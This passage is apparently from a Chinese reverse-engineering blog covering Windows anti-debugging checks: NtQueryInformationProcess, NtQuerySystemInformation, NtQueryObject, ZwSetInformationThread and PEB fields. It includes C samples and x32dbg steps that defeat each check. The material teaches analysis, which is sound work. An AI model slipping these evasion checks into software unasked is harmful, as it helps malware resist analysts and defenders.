//0x7\tProcessExceptionPort,\tProcessAccessToken,\tProcessLdtInformation,\tProcessLdtSize,\tProcessDefaultHardErrorMode,\tProcessIoPortHandlers,\tProcessPooledUsageAndLimits,\tProcessWorkingSetWatch,\tProcessUserModeIOPL,\tProcessEnableAlignmentFaultFixup,\tProcessPriorityClass,\tProcessWx86Information,\tProcessHandleCount,\tProcessAffinityMask,\tProcessPriorityBoost,\tMaxProcessInfoClass,\tProcessWow64Information=26,\tProcessImageFileName=27,\tProcessDebugObjectHandle=30,     //0x1E\tProcessDebugFlags=32,            //0x1F&#125;\n\n以上代码中与调试器探测有关的成员为ProcessDebugPort（0x7）、ProcessDebugObjectHandle（0x1E）、\nProcessDebugFlags（0x1F）。\n与反调试相关的成员ProcessDebugPort（0x7）进程处于调试状态时，系统就会为它分配1个调试端口（Debug Port）。ProcessInformationClass参数的值设置为ProcessDebugPort（0x7）时，调用NtQueryInformationProcess()函数就能获取调试端口。若进程处于非调试状态，则变量dwDebugPort的值被设置为0；若进程处于调试状态，则变量dwDebugPort的值被设置为0xFFFFFFFF，参考如下代码：\n12345678910//ProcessDebugPort（0x7）DWORD dwDebugPort=0;pNtQueryInformationProcess(GetCurrentProcess(),\t\t\t\t        \tProcessDebugPort,\t\t\t\t        \t&amp;dwDebugPort,\t\t\t\t        \tsizeof(dwDebugPort),\t\t\t\t        \tNULL);printf(&quot;NtQueryInformationProcess(ProcessDebugPort)=0x%X\\n&quot;,dwDebugPort);if(dwDebugPort !=0x0) printf(&quot;=&gt; Debugging!\\n\\n&quot;);else printf(&quot;=&gt; Not Debugging!\\n\\n&quot;);\n\nCheckRemoteDebuggerPresent()CheckRemoteDebuggerPresent() API与IsDebuggerPresent() API类似，用来检测进程是否处于调试状态。CheckRemoteDebuggerPresent()函数不仅可以用来检测当前进程，还可以用来检测其他进程是否处于调试状态。进入CheckRemoteDebuggerPresent() API查看代码，可以看到其调用了NtQueryInformationProcess(ProcessDebugPort) API。如下图所示：\n API内部代码.png)\nProcessDebugObjectHandle（0x1E）调试进程时会生成调试对象（Debug Object）。函数的第二个参数值为ProcessDebugObjectHandle（0x1E）时，调用函数后通过第三个参数就能获取调试对象句柄。进程处于调试状态时，调试对象句柄的值就存在；若进程处于非调试状态，则调试对象句柄值为NULL。\n12345678910//ProcessDebugObjectHandle（0x1E）HANDLE hDebugObject=NULL;pNtQueryInformationProcess(GetCurrentProcess(),\t\t\t\t        \tProcessDebugObjectHandle,\t\t\t\t        \t&amp;hDebugObject,\t\t\t\t        \tsizeof(hDebugObject),\t\t\t\t        \tNULL);printf(&quot;NtQueryInformationProcess(ProcessDebugObjectHandle)=0x%X\\n&quot;,hDebugObject);if(hDebugObject !=0x0) printf(&quot;=&gt; Debugging!\\n\\n&quot;);else printf(&quot;=&gt; Not Debugging!\\n\\n&quot;);\n\n\n\nProcessDebugFlags（0x1F）检测Debug Flags（调试标志）的值也可以判断进程是否处于被调试状态。函数的第二个参数设置为ProcessDebugFlags（0x1F）时，调用函数后通过第三个参数即可获取调试标志的值：若为0，则进程处于被调试状态；若为1，则进程处于非调试状态。\n12345678910//ProcessDebugFlags（0x1F）BOOL bDebugFlag=TRUE;pNtQueryInformationProcess(GetCurrentProcess(),\t\t\t\t        \tProcessDebugFlags,\t\t\t\t        \t&amp;bDebugFlag,\t\t\t\t        \tsizeof(bDebugFlag),\t\t\t\t        \tNULL);printf(&quot;NtQueryInformationProcess(ProcessDebugFlags)=0x%X\\n&quot;,bDebugFlag);if(bDebugFlag ==0x0) printf(&quot;=&gt; Debugging!\\n\\n&quot;);else printf(&quot;=&gt; Not Debugging!\\n\\n&quot;);\n\n\n\n\n\nNtQuerySystemInformation()之前介绍的是通过探测调试器来判断自己的进程是否处于被调试状态，下面是基于调试环境检测的反调试技术。运用这种反调试技术可以检测当前OS是否在调试模式下运行。\n\n\n\n\n\n\n\n\n\n设置调试模式的方法：\n（1）Windows XP：编辑”boot.ini”后重启\n[boot loader]\ntimeout&#x3D;30\ndefault&#x3D;multi(0)disk(0)rdisk(0)partition(1)\\WINDOWS\n[operating systems]\nmulti(0)disk(0)rdisk(0)partition(1)\\WINDOWS&#x3D;”Microsoft Windows XP Professional” &#x2F;noexecute&#x3D;optin &#x2F;fastdetect &#x2F;debugport&#x3D;com1 &#x2F;baudrate&#x3D;115200 &#x2F;Debug\n（2）Windows7：使用bcdedit.exe实用程序\n命令：bcdedit &#x2F;debug on\nNtQuerySystemInformation定义ntdll!NtQuerySystemInformation() API是一个系统函数，用来获取当前运行的多种OS信息。其定义如下：\n123456NTSTATUS WINAPI NtQuerySystemInformation(\t__in SYSTEM_INFORMATION_CLASS SystemInformationClass,\t__inout PVOID SystemInformation,\t__in ULONG SystemInformationLength,\t__out_opt PULONG ReturnLength);\n\nSYSTEM_INFORMATION_CLASS SystemInformationClass参数中指定需要的系统信息类型，将某结构体的地址传递给PVOID SystemInformation参数，API返回时，该结构体中就填充着相关信息。\nSYSTEM_INFORMATION_CLASS是枚举类型，拥有的值如下：\n123456789101112typedef enum _SYSTEM_INFORMATION_CLASS&#123;\tSystemBasicInformation=0,\tSystemPerformanceInformation=2,\tSystemTimeOfDayInformation=3,\tSystemProcessInformation=5,\tSystemProcessPerformanceInformation=8,\tSystemInterruptInformation=23,        \tSystemExceptionInformation=33,\tSystemKernelDebuggerInformation=35,  //0x23\tSystemRegistryQuotaInformation=37,     SystemLookasideInformation=45&#125;SYSTEM_INFORMATION_CLASS;\n\n向SystemInformationClass参数传入SystemKernelDebuggerInformation（0x23）值，即可判断出当前OS是否在调试模式下运行。\nSystemKernelDebuggerInformation（0x23）查看实际的反调试源代码即可轻松掌握其原理：\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &quot;stdio.h&quot;#include &quot;windows.h&quot;#include &quot;tchar.h&quot;void MyNtQuerySystemInformation()&#123;    typedef NTSTATUS (WINAPI *NTQUERYSYSTEMINFORMATION)(        ULONG SystemInformationClass,        PVOID SystemInformation,        ULONG SystemInformationLength,        PULONG ReturnLength    );    typedef struct _SYSTEM_KERNEL_DEBUGGER_INFORMATION     &#123;        BOOLEAN DebuggerEnabled;        BOOLEAN DebuggerNotPresent;    &#125; SYSTEM_KERNEL_DEBUGGER_INFORMATION, *PSYSTEM_KERNEL_DEBUGGER_INFORMATION;    NTQUERYSYSTEMINFORMATION NtQuerySystemInformation;      NtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)                                  GetProcAddress(GetModuleHandle(L&quot;ntdll&quot;),                                                &quot;NtQuerySystemInformation&quot;);    ULONG SystemKernelDebuggerInformation = 0x23;    ULONG ulReturnedLength = 0;    SYSTEM_KERNEL_DEBUGGER_INFORMATION DebuggerInfo = &#123;0,&#125;;    NtQuerySystemInformation(SystemKernelDebuggerInformation,                              (PVOID) &amp;DebuggerInfo,                              sizeof(DebuggerInfo),      // 2 bytes                             &amp;ulReturnedLength);    printf(&quot;NtQuerySystemInformation(SystemKernelDebuggerInformation) = 0x%X 0x%X\\n&quot;,            DebuggerInfo.DebuggerEnabled, DebuggerInfo.DebuggerNotPresent);    if( DebuggerInfo.DebuggerEnabled )  printf(&quot;  =&gt; Debugging!!!\\n\\n&quot;);    else                                printf(&quot;  =&gt; Not debugging...\\n\\n&quot;);&#125;int _tmain(int argc, TCHAR* argv[])&#123;    MyNtQuerySystemInformation();    printf(&quot;\\npress any key to quit...\\n&quot;);    _gettch();    return 0;&#125;\n\n上述代码中，调用NtQuerySystemInformation() API时，第一个参数（SystemInformationClass）的值被设置为SystemKernelDebuggerInformation（0x23），第二个参数（SystemInformation）为SYSTEM_KERNEL_DEBUGGER_INFORMATION结构体的地址。当API返回时，若系统处在调试模式下，则SYSTEM_KERNEL_DEBUGGER_INFORMATION.DebuggerEnabled的值被设置为1（SYSTEM_KERNEL_DEBUGGER_INFORMATION.DebuggerNotPresent的值恒为1）。\n破解之法在Windows XP系统中编辑boot.ini文件，删除”&#x2F;debugport&#x3D;com1 &#x2F;baudrate&#x3D;115200 &#x2F;Debug”值。在Windows 7系统的命令行窗口执行”bcdedit &#x2F;debug off”命令即可。并且重启系统则要以正常模式启动。\nNtQueryObject()系统中的某个调试器调试进程时，会创建1个调试对象类型的内核对象，检测该对象是否存在即可判断是否有进程正在被调试。\nNtQueryObject定义ntdll!NtQueryObject() API用来获取系统各种内核对象的信息，NtQueryObject()函数的定义如下：\n1234567NTSTATUS NtQueryObject(\t__in_opt HANDLE Handle,\t__in OBJECT_INFORMATION_CLASS ObjectInformationClass,\t__out_opt PVOID ObjectInformation,\t__in ULONG ObjectInformationLength,\t__out_opt PULONG ReturnLength);\n\n调用NtQueryObject()函数时，先向第二个参数OBJECT_INFORMATION_CLASS ObjectInformationClass赋予某个特定值，调用API后，包含相关信息的结构体指针就被返回第三个参数PVOID ObjectInformation。\nOBJECT_INFORMATION_CLASS是枚举类型，其拥有的值如下：\n1234567typedef enum _OBJECT_INFORMATION_CLASS&#123;\tObjectBasicInformation,\tObjectNameInformation,\tObjectTypeInformation,\tObjectAllTypesInformation,            //3\tObjectHandleInformation&#125;OBJECT_INFORMATION_CLASS,*POBJECT_INFORMATION_CLASS;\n\n首先使用ObjectAllTypesInformation值获取系统所有对象信息，然后从中检测是否存在调试对象。\nNtQueryObject() API使用方法（1）获取内核对象信息链表的大小\n12ULONG lSize = 0;pNtQueryObject(NULL, ObjectAllTypesInformation, &amp;lSize, sizeof(lSize), &amp;lSize);\n\n（2）分配内存\n12void *pBuf = NULL;pBuf = VirtualAlloc(NULL, lSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);\n\n（3）获取内核对象信息链表\n12345678910111213typedef struct _OBJECT_TYPE_INFORMATION &#123;        UNICODE_STRING TypeName;        ULONG TotalNumberOfHandles;        ULONG TotalNumberOfObjects;&#125;OBJECT_TYPE_INFORMATION, *POBJECT_TYPE_INFORMATION;typedef struct _OBJECT_ALL_INFORMATION &#123;        ULONG                   NumberOfObjectsTypes;        OBJECT_TYPE_INFORMATION ObjectTypeInformation[1];&#125; OBJECT_ALL_INFORMATION, *POBJECT_ALL_INFORMATION;pNtQueryObject((HANDLE)0xFFFFFFFF, ObjectAllTypesInformation, pBuf, lSize, NULL);POBJECT_ALL_INFORMATION pObjectAllInfo = (POBJECT_ALL_INFORMATION)pBuf;\n\n调用NtQueryObjec函数后，系统所有对象的信息代码就被存入pBuf，然后将pBuf转换为OBJECT_ALL_INFORMATION类型。OBJECT_ALL_INFORMATION结构体由OBJECT_TYPE_INFORMATION结构体数组构成。实际内核对象类型的信息就被存储在OBJECT_TYPE_INFORMATION结构体数组中，通过循环检索即可查看是否存在”调试对象”对象类型。\n（4）确定”调试对象”对象类型\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495#include &quot;stdio.h&quot;#include &quot;windows.h&quot;#include &quot;tchar.h&quot;typedef enum _OBJECT_INFORMATION_CLASS &#123;    ObjectBasicInformation,    ObjectNameInformation,    ObjectTypeInformation,    ObjectAllTypesInformation,    ObjectHandleInformation&#125; OBJECT_INFORMATION_CLASS, *POBJECT_INFORMATION_CLASS;void MyNtQueryObject()&#123;    typedef struct _LSA_UNICODE_STRING &#123;        USHORT Length;        USHORT MaximumLength;        PWSTR Buffer;    &#125; LSA_UNICODE_STRING, *PLSA_UNICODE_STRING, UNICODE_STRING, *PUNICODE_STRING;    typedef NTSTATUS (WINAPI *NTQUERYOBJECT)(        HANDLE Handle,        OBJECT_INFORMATION_CLASS ObjectInformationClass,        PVOID ObjectInformation,        ULONG ObjectInformationLength,        PULONG ReturnLength    );        #pragma pack(1)    typedef struct _OBJECT_TYPE_INFORMATION &#123;        UNICODE_STRING TypeName;        ULONG TotalNumberOfHandles;        ULONG TotalNumberOfObjects;    &#125;OBJECT_TYPE_INFORMATION, *POBJECT_TYPE_INFORMATION;    typedef struct _OBJECT_ALL_INFORMATION &#123;        ULONG                   NumberOfObjectsTypes;        OBJECT_TYPE_INFORMATION ObjectTypeInformation[1];    &#125; OBJECT_ALL_INFORMATION, *POBJECT_ALL_INFORMATION;    #pragma pack()           POBJECT_ALL_INFORMATION pObjectAllInfo = NULL;    void *pBuf = NULL;    ULONG lSize = 0;    BOOL bDebugging = FALSE;    NTQUERYOBJECT pNtQueryObject = (NTQUERYOBJECT)                                    GetProcAddress(GetModuleHandle(L&quot;ntdll.dll&quot;),                                                    &quot;NtQueryObject&quot;);    // Get the size of the list    pNtQueryObject(NULL, ObjectAllTypesInformation, &amp;lSize, sizeof(lSize), &amp;lSize);    // Allocate list buffer    pBuf = VirtualAlloc(NULL, lSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);    // Get the actual list    pNtQueryObject((HANDLE)0xFFFFFFFF, ObjectAllTypesInformation, pBuf, lSize, NULL);    pObjectAllInfo = (POBJECT_ALL_INFORMATION)pBuf;    UCHAR *pObjInfoLocation = (UCHAR *)pObjectAllInfo-&gt;ObjectTypeInformation;    POBJECT_TYPE_INFORMATION pObjectTypeInfo = NULL;    for( UINT i = 0; i &lt; pObjectAllInfo-&gt;NumberOfObjectsTypes; i++ )    &#123;        pObjectTypeInfo = (POBJECT_TYPE_INFORMATION)pObjInfoLocation;        if( wcscmp(L&quot;DebugObject&quot;, pObjectTypeInfo-&gt;TypeName.Buffer) == 0 )        &#123;            bDebugging = (pObjectTypeInfo-&gt;TotalNumberOfObjects &gt; 0) ? TRUE : FALSE;            break;        &#125;                // calculate next struct        pObjInfoLocation = (UCHAR*)pObjectTypeInfo-&gt;TypeName.Buffer;        pObjInfoLocation += pObjectTypeInfo-&gt;TypeName.Length;        pObjInfoLocation = (UCHAR*)(((ULONG)pObjInfoLocation &amp; 0xFFFFFFFC) + sizeof(ULONG));    &#125;    if( pBuf )    VirtualFree(pBuf, 0, MEM_RELEASE);    printf(&quot;NtQueryObject(ObjectAllTypesInformation)\\n&quot;);    if( bDebugging )  printf(&quot;  =&gt; Debugging!!!\\n\\n&quot;);    else              printf(&quot;  =&gt; Not debugging...\\n\\n&quot;);&#125;int _tmain(int argc, TCHAR* argv[])&#123;    MyNtQueryObject();    printf(&quot;\\npress any key to quit...\\n&quot;);    _gettch();    return 0;&#125;\n\n练习1.用x32dbg打开StaAD_NtQO.exe，显示”Debugging!!!”，这是因为NtQueryObject() API中探测到了调试对象。\n\n2.破解之法\n重新运行程序，在401059地址处设置断点（可以先在ntdll!NtQueryObject API处下断点，然后运行直到返回，查看调用处的第二个参数是否为3，是则在调用处下断点，该程序中位于401059地址处），然后运行程序。\n①401059地址处的CALL ESI指令用来调用ntdll!NtQueryObject() API，此时查看栈可发现，第二个参数的值为ObjectAllTypesInformation（3）\n\n②将栈中第二个参数的值修改为0后再执行401059处的指令，这样就无法探测到调试器的存在了\n\n当然，直接钩取ntdll!NtQueryObject() API，输入ObjectAllTypesInformation（3）值或操作结果值，也能不被探测到。\nZwSetInformationThread()下面介绍强制分离（Detach）被调试者和调试者的技术。\nZwSetInformationThread定义利用ZwSetInformationThread() API，被调试者可将自身从调试器中分离出来。其定义如下：\n123456789101112131415161718192021222324252627typedef enum _THREAD_INFORMATION_CLASS &#123;        ThreadBasicInformation,        ThreadTimes,        ThreadPriority,        ThreadBasePriority,        ThreadAffinityMask,        ThreadImpersonationToken,        ThreadDescriptorTableEntry,        ThreadEnableAlignmentFaultFixup,        ThreadEventPair,        ThreadQuerySetWin32StartAddress,        ThreadZeroTlsCell,        ThreadPerformanceCount,        ThreadAmILastThread,        ThreadIdealProcessor,        ThreadPriorityBoost,        ThreadSetTlsArrayAddress,        ThreadIsIoPending,        ThreadHideFromDebugger           // 17 (0x11)&#125; THREAD_INFORMATION_CLASS, *PTHREAD_INFORMATION_CLASS;typedef NTSTATUS (WINAPI* ZWSETINFORMATIONTHREAD)(        __in HANDLE ThreadHandle,        __in THREAD_INFORMATION_CLASS ThreadInformationClass,        __in PVOID ThreadInformation,        __in ULONG ThreadInformationLength);\n\nZwSetInformationThread()函数是一个系统原生API，它是用来为线程设置信息的。该函数拥有2个参数，第一个参数ThreadHandle用来接收当前线程的句柄，第二个参数ThreadInformationClass表示线程信息类型，若其值设置为ThreadHideFromDebugger(0x11)，调用该函数后，调试进程就会被分离出来。ZwSetInformationThread() API不会对正常运行的程序（非调试运行）产生任何影响，但若运行的是调试器程序，调用该API将使调试器终止运行，同时终止自身进程。\n练习1.用x32dbg打开StaAD_ZwSIT.exe，分别在401027、401029处设置断点，然后运行到401027处\n调试器在401027处暂停，位于该地址处的CALL ESI指令用来调用ntdll!ZwSetInformationThread() API。运行401027处的指令，这样就会分离出被调试进程并终止运行。而且调试器无法正常调试401029地址处的指令，出现运行错误\n\n2.破解之法\n①调用401027地址处的ZwSetInformationThread() API前，查找存储在栈中的第二个参数ThreadInformationClass值，若其值为ThreadHideFromDebugger(0x11)，则修改为0后继续运行即可。\n②也可以钩取ZwSetInformationThread() API，并以同样方式操作函数的参数。\n\n\n\n\n\n\n\n\n\n利用ZwSetInformationThread()进行反调试的工作原理是：将线程隐藏起来，调试器就接收不到信息，从而无法调试。另外，Windows XP以后新增了DebugActiveProcessStop() API.\n123BOOL WINAPI DebugActiveProcessStop(\t__in DWORD dwProcessId);\n\nDebugActiveProcessStop() API用来分离调试器与被调试进程，从而停止调试。前面介绍的ZwSetInformationThread() API则用来隐藏当前线程，使调试器无法再收到该线程的调试事件，最终停止调试。\n","slug":"Windows静态反调试技术（二）","date":"2022-06-22T13:16:13.000Z","categories_index":"","tags_index":"逆向,Windows静态反调试技术","author_index":"0netry"},{"id":"cfe529b139f3ec3d5a0094d71b2823b9","title":"Windows静态反调试技术（一）","content":"PEB利用PEB结构体信息可以判断当前进程是否处于被调试状态。回顾下PEB结构体的成员：\nWin7 x86中：\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192930: kd&gt; dt _PEBntdll!_PEB   +0x000 InheritedAddressSpace : UChar   +0x001 ReadImageFileExecOptions : UChar   +0x002 BeingDebugged    : UChar   +0x003 BitField         : UChar   +0x003 ImageUsesLargePages : Pos 0, 1 Bit   +0x003 IsProtectedProcess : Pos 1, 1 Bit   +0x003 IsLegacyProcess  : Pos 2, 1 Bit   +0x003 IsImageDynamicallyRelocated : Pos 3, 1 Bit   +0x003 SkipPatchingUser32Forwarders : Pos 4, 1 Bit   +0x003 SpareBits        : Pos 5, 3 Bits   +0x004 Mutant           : Ptr32 Void   +0x008 ImageBaseAddress : Ptr32 Void   +0x00c Ldr              : Ptr32 _PEB_LDR_DATA   +0x010 ProcessParameters : Ptr32 _RTL_USER_PROCESS_PARAMETERS   +0x014 SubSystemData    : Ptr32 Void   +0x018 ProcessHeap      : Ptr32 Void   +0x01c FastPebLock      : Ptr32 _RTL_CRITICAL_SECTION   +0x020 AtlThunkSListPtr : Ptr32 Void   +0x024 IFEOKey          : Ptr32 Void   +0x028 CrossProcessFlags : Uint4B   +0x028 ProcessInJob     : Pos 0, 1 Bit   +0x028 ProcessInitializing : Pos 1, 1 Bit   +0x028 ProcessUsingVEH  : Pos 2, 1 Bit   +0x028 ProcessUsingVCH  : Pos 3, 1 Bit   +0x028 ProcessUsingFTH  : Pos 4, 1 Bit   +0x028 ReservedBits0    : Pos 5, 27 Bits   +0x02c KernelCallbackTable : Ptr32 Void   +0x02c UserSharedInfoPtr : Ptr32 Void   +0x030 SystemReserved   : [1] Uint4B   +0x034 AtlThunkSListPtr32 : Uint4B   +0x038 ApiSetMap        : Ptr32 Void   +0x03c TlsExpansionCounter : Uint4B   +0x040 TlsBitmap        : Ptr32 Void   +0x044 TlsBitmapBits    : [2] Uint4B   +0x04c ReadOnlySharedMemoryBase : Ptr32 Void   +0x050 HotpatchInformation : Ptr32 Void   +0x054 ReadOnlyStaticServerData : Ptr32 Ptr32 Void   +0x058 AnsiCodePageData : Ptr32 Void   +0x05c OemCodePageData  : Ptr32 Void   +0x060 UnicodeCaseTableData : Ptr32 Void   +0x064 NumberOfProcessors : Uint4B   +0x068 NtGlobalFlag     : Uint4B   +0x070 CriticalSectionTimeout : _LARGE_INTEGER   +0x078 HeapSegmentReserve : Uint4B   +0x07c HeapSegmentCommit : Uint4B   +0x080 HeapDeCommitTotalFreeThreshold : Uint4B   +0x084 HeapDeCommitFreeBlockThreshold : Uint4B   +0x088 NumberOfHeaps    : Uint4B   +0x08c MaximumNumberOfHeaps : Uint4B   +0x090 ProcessHeaps     : Ptr32 Ptr32 Void   +0x094 GdiSharedHandleTable : Ptr32 Void   +0x098 ProcessStarterHelper : Ptr32 Void   +0x09c GdiDCAttributeList : Uint4B   +0x0a0 LoaderLock       : Ptr32 _RTL_CRITICAL_SECTION   +0x0a4 OSMajorVersion   : Uint4B   +0x0a8 OSMinorVersion   : Uint4B   +0x0ac OSBuildNumber    : Uint2B   +0x0ae OSCSDVersion     : Uint2B   +0x0b0 OSPlatformId     : Uint4B   +0x0b4 ImageSubsystem   : Uint4B   +0x0b8 ImageSubsystemMajorVersion : Uint4B   +0x0bc ImageSubsystemMinorVersion : Uint4B   +0x0c0 ActiveProcessAffinityMask : Uint4B   +0x0c4 GdiHandleBuffer  : [34] Uint4B   +0x14c PostProcessInitRoutine : Ptr32     void    +0x150 TlsExpansionBitmap : Ptr32 Void   +0x154 TlsExpansionBitmapBits : [32] Uint4B   +0x1d4 SessionId        : Uint4B   +0x1d8 AppCompatFlags   : _ULARGE_INTEGER   +0x1e0 AppCompatFlagsUser : _ULARGE_INTEGER   +0x1e8 pShimData        : Ptr32 Void   +0x1ec AppCompatInfo    : Ptr32 Void   +0x1f0 CSDVersion       : _UNICODE_STRING   +0x1f8 ActivationContextData : Ptr32 _ACTIVATION_CONTEXT_DATA   +0x1fc ProcessAssemblyStorageMap : Ptr32 _ASSEMBLY_STORAGE_MAP   +0x200 SystemDefaultActivationContextData : Ptr32 _ACTIVATION_CONTEXT_DATA   +0x204 SystemAssemblyStorageMap : Ptr32 _ASSEMBLY_STORAGE_MAP   +0x208 MinimumStackCommit : Uint4B   +0x20c FlsCallback      : Ptr32 _FLS_CALLBACK_INFO   +0x210 FlsListHead      : _LIST_ENTRY   +0x218 FlsBitmap        : Ptr32 Void   +0x21c FlsBitmapBits    : [4] Uint4B   +0x22c FlsHighIndex     : Uint4B   +0x230 WerRegistrationData : Ptr32 Void   +0x234 WerShipAssertPtr : Ptr32 Void   +0x238 pContextData     : Ptr32 Void   +0x23c pImageHeaderHash : Ptr32 Void   +0x240 TracingFlags     : Uint4B   +0x240 HeapTracingEnabled : Pos 0, 1 Bit   +0x240 CritSecTracingEnabled : Pos 1, 1 Bit   +0x240 SpareTracingBits : Pos 2, 30 Bits\n\nWin10 x64中：\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116kd&gt; dt ntdll!_PEB   +0x000 InheritedAddressSpace : UChar   +0x001 ReadImageFileExecOptions : UChar   +0x002 BeingDebugged    : UChar   +0x003 BitField         : UChar   +0x003 ImageUsesLargePages : Pos 0, 1 Bit   +0x003 IsProtectedProcess : Pos 1, 1 Bit   +0x003 IsImageDynamicallyRelocated : Pos 2, 1 Bit   +0x003 SkipPatchingUser32Forwarders : Pos 3, 1 Bit   +0x003 IsPackagedProcess : Pos 4, 1 Bit   +0x003 IsAppContainer   : Pos 5, 1 Bit   +0x003 IsProtectedProcessLight : Pos 6, 1 Bit   +0x003 IsLongPathAwareProcess : Pos 7, 1 Bit   +0x004 Padding0         : [4] UChar   +0x008 Mutant           : Ptr64 Void   +0x010 ImageBaseAddress : Ptr64 Void   +0x018 Ldr              : Ptr64 _PEB_LDR_DATA   +0x020 ProcessParameters : Ptr64 _RTL_USER_PROCESS_PARAMETERS   +0x028 SubSystemData    : Ptr64 Void   +0x030 ProcessHeap      : Ptr64 Void   +0x038 FastPebLock      : Ptr64 _RTL_CRITICAL_SECTION   +0x040 AtlThunkSListPtr : Ptr64 _SLIST_HEADER   +0x048 IFEOKey          : Ptr64 Void   +0x050 CrossProcessFlags : Uint4B   +0x050 ProcessInJob     : Pos 0, 1 Bit   +0x050 ProcessInitializing : Pos 1, 1 Bit   +0x050 ProcessUsingVEH  : Pos 2, 1 Bit   +0x050 ProcessUsingVCH  : Pos 3, 1 Bit   +0x050 ProcessUsingFTH  : Pos 4, 1 Bit   +0x050 ProcessPreviouslyThrottled : Pos 5, 1 Bit   +0x050 ProcessCurrentlyThrottled : Pos 6, 1 Bit   +0x050 ProcessImagesHotPatched : Pos 7, 1 Bit   +0x050 ReservedBits0    : Pos 8, 24 Bits   +0x054 Padding1         : [4] UChar   +0x058 KernelCallbackTable : Ptr64 Void   +0x058 UserSharedInfoPtr : Ptr64 Void   +0x060 SystemReserved   : Uint4B   +0x064 AtlThunkSListPtr32 : Uint4B   +0x068 ApiSetMap        : Ptr64 Void   +0x070 TlsExpansionCounter : Uint4B   +0x074 Padding2         : [4] UChar   +0x078 TlsBitmap        : Ptr64 Void   +0x080 TlsBitmapBits    : [2] Uint4B   +0x088 ReadOnlySharedMemoryBase : Ptr64 Void   +0x090 SharedData       : Ptr64 Void   +0x098 ReadOnlyStaticServerData : Ptr64 Ptr64 Void   +0x0a0 AnsiCodePageData : Ptr64 Void   +0x0a8 OemCodePageData  : Ptr64 Void   +0x0b0 UnicodeCaseTableData : Ptr64 Void   +0x0b8 NumberOfProcessors : Uint4B   +0x0bc NtGlobalFlag     : Uint4B   +0x0c0 CriticalSectionTimeout : _LARGE_INTEGER   +0x0c8 HeapSegmentReserve : Uint8B   +0x0d0 HeapSegmentCommit : Uint8B   +0x0d8 HeapDeCommitTotalFreeThreshold : Uint8B   +0x0e0 HeapDeCommitFreeBlockThreshold : Uint8B   +0x0e8 NumberOfHeaps    : Uint4B   +0x0ec MaximumNumberOfHeaps : Uint4B   +0x0f0 ProcessHeaps     : Ptr64 Ptr64 Void   +0x0f8 GdiSharedHandleTable : Ptr64 Void   +0x100 ProcessStarterHelper : Ptr64 Void   +0x108 GdiDCAttributeList : Uint4B   +0x10c Padding3         : [4] UChar   +0x110 LoaderLock       : Ptr64 _RTL_CRITICAL_SECTION   +0x118 OSMajorVersion   : Uint4B   +0x11c OSMinorVersion   : Uint4B   +0x120 OSBuildNumber    : Uint2B   +0x122 OSCSDVersion     : Uint2B   +0x124 OSPlatformId     : Uint4B   +0x128 ImageSubsystem   : Uint4B   +0x12c ImageSubsystemMajorVersion : Uint4B   +0x130 ImageSubsystemMinorVersion : Uint4B   +0x134 Padding4         : [4] UChar   +0x138 ActiveProcessAffinityMask : Uint8B   +0x140 GdiHandleBuffer  : [60] Uint4B   +0x230 PostProcessInitRoutine : Ptr64     void    +0x238 TlsExpansionBitmap : Ptr64 Void   +0x240 TlsExpansionBitmapBits : [32] Uint4B   +0x2c0 SessionId        : Uint4B   +0x2c4 Padding5         : [4] UChar   +0x2c8 AppCompatFlags   : _ULARGE_INTEGER   +0x2d0 AppCompatFlagsUser : _ULARGE_INTEGER   +0x2d8 pShimData        : Ptr64 Void   +0x2e0 AppCompatInfo    : Ptr64 Void   +0x2e8 CSDVersion       : _UNICODE_STRING   +0x2f8 ActivationContextData : Ptr64 _ACTIVATION_CONTEXT_DATA   +0x300 ProcessAssemblyStorageMap : Ptr64 _ASSEMBLY_STORAGE_MAP   +0x308 SystemDefaultActivationContextData : Ptr64 _ACTIVATION_CONTEXT_DATA   +0x310 SystemAssemblyStorageMap : Ptr64 _ASSEMBLY_STORAGE_MAP   +0x318 MinimumStackCommit : Uint8B   +0x320 SparePointers    : [4] Ptr64 Void   +0x340 SpareUlongs      : [5] Uint4B   +0x358 WerRegistrationData : Ptr64 Void   +0x360 WerShipAssertPtr : Ptr64 Void   +0x368 pUnused          : Ptr64 Void   +0x370 pImageHeaderHash : Ptr64 Void   +0x378 TracingFlags     : Uint4B   +0x378 HeapTracingEnabled : Pos 0, 1 Bit   +0x378 CritSecTracingEnabled : Pos 1, 1 Bit   +0x378 LibLoaderTracingEnabled : Pos 2, 1 Bit   +0x378 SpareTracingBits : Pos 3, 29 Bits   +0x37c Padding6         : [4] UChar   +0x380 CsrServerReadOnlySharedMemoryBase : Uint8B   +0x388 TppWorkerpListLock : Uint8B   +0x390 TppWorkerpList   : _LIST_ENTRY   +0x3a0 WaitOnAddressHashTable : [128] Ptr64 Void   +0x7a0 TelemetryCoverageHeader : Ptr64 Void   +0x7a8 CloudFileFlags   : Uint4B   +0x7ac CloudFileDiagFlags : Uint4B   +0x7b0 PlaceholderCompatibilityMode : Char   +0x7b1 PlaceholderCompatibilityModeReserved : [7] Char   +0x7b8 LeapSecondData   : Ptr64 _LEAP_SECOND_DATA   +0x7c0 LeapSecondFlags  : Uint4B   +0x7c0 SixtySecondEnabled : Pos 0, 1 Bit   +0x7c0 Reserved         : Pos 1, 31 Bits   +0x7c4 NtGlobalFlag2    : Uint4B\n\n与反调试相关的成员其中与反调试相关的成员有如下几个：\n1234567+0x002 BeingDebugged    : UChar+0x00c Ldr              : Ptr32 _PEB_LDR_DATA+0x018 ProcessHeap      : Ptr32 Void+0x068 NtGlobalFlag     : Uint4B\n\nBeingDebugged成员是一个标志（Flag），用来表示进程是否处于被调试状态。\nLdr 、ProcessHeap、NtGlobalFlag成员与被调试进程的堆内存特性相关。\n\n\n\n\n\n\n\n\n\n借助FS段寄存器所指的TEB结构体可轻松获取进程的PEB结构体地址。TEB.ProcessEnvironmentBlock成员（偏移为+0x30）指向PEB结构体的地址，有以下两种方法可以获取PEB结构体的地址。\n（1）直接获取PEB的地址\nMOV EAX,DWORD PTR FS:[0x30];       FS:[0x30]&#x3D;address of 